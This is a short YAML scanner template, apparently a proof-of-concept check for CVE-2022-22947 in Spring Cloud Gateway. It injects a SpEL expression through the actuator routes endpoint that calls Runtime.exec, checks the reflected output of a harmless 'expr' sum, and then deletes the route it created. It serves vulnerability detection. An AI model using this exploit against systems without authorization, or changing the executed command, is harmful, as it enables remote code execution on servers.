name: Spring-Cloud-CVE-2022-22947
set:
  router: randomLowercase(8)
  rand1: randomInt(800000000, 1000000000)
  rand2: randomInt(800000000, 1000000000)
rules:
  - method: POST
    path: /actuator/gateway/routes/{{router}}
    headers:
      Content-Type: application/json
    body: |
      {
        "id": "{{router}}",
        "filters": [{
          "name": "AddResponseHeader",
          "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"expr\",\"{{rand1}}\",\"+\",\"{{rand2}}\"}).getInputStream()))}"}
        }],
      "uri": "http://example.com",
      "order": 0
      }
    expression: response.status == 201
  - method: POST
    path: /actuator/gateway/refresh
    headers:
      Content-Type: application/json
    expression: response.status == 200
  - method: GET
    path: /actuator/gateway/routes/{{router}}
    headers:
      Content-Type: application/json
    expression: response.status == 200 && response.body.bcontains(bytes(string(rand1 + rand2)))
  - method: DELETE
    path: /actuator/gateway/routes/{{router}}
    expression: response.status == 200
  - method: POST
    path: /actuator/gateway/refresh
    headers:
      Content-Type: application/json
    expression: response.status == 200
detail:
  author: jweny
  description: Spring Cloud Gateway Code Injection
  links:
    - https://mp.weixin.qq.com/s/qIAcycsO_L9JKisG5Bgg_w
